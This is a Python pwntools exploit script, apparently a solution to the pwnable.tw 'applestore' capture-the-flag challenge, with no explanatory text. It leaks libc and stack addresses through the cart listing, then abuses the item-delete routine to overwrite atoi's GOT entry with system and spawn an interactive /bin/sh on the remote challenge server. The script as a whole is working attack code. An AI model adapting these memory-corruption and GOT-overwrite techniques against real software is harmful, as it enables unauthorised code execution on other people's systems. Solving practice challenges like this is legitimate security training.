from pwn import *
import sys 

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwnabletw_applestore")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./pwnabletw_applestore")
else:
	p = remote("chall.pwnable.tw","10104")
	libc = ELF("./libc_32.so.6")
	elf = ELF("./pwnabletw_applestore")

def list():
	p.sendafter("> ","1")

def add(number):
	p.sendafter("> ","2")
	p.sendafter("Device Number> ",str(number))
	p.recvuntil("You've put")

def delete(payload):
	p.sendafter("> ","3")
	p.sendafter("Item Number> ",payload)

def cart(target,yes = True):
	p.sendafter("> ","4")
	if yes:
		p.sendafter("> ","y\x00" + p32(target) + p32(0)*2)
	else:
		p.sendafter("> ","n")

def checkout(yes = True):
	p.sendafter("> ","5")
	if yes:
		p.sendafter("> ","y")
	else:
		p.sendafter("> ","n")
	
def debugf():
	gdb.attach(p,"b *0x08048C1B\nb *0x08048B98\n b*0x08048ABE")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()
for i in range(20):
	add(2)
for i in range(6):
	add(1)
#debugf()
checkout()
cart(elf.got["atoi"])
p.recvuntil("27: ")
atoi_addr = u32(p.recv(4))
libc.address = atoi_addr - libc.symbols["atoi"]
log.success("libc_base:" + hex(libc.address))
log.success("environ:" + hex(libc.symbols["environ"]))
cart(libc.symbols["environ"])
p.recvuntil("27: ")
stack_addr = u32(p.recv(4))
ebp_addr = stack_addr - 0x100
ebp_new = ebp_addr - 0xC
payload = "27" + p32(elf.got["atoi"]) + "aaaa" + p32(elf.got["atoi"] + 0x22) + p32(ebp_new)
delete(payload)
payload = p32(libc.symbols["system"]) + ";/bin/sh\x00"
p.sendafter("> ",payload)
p.interactive()
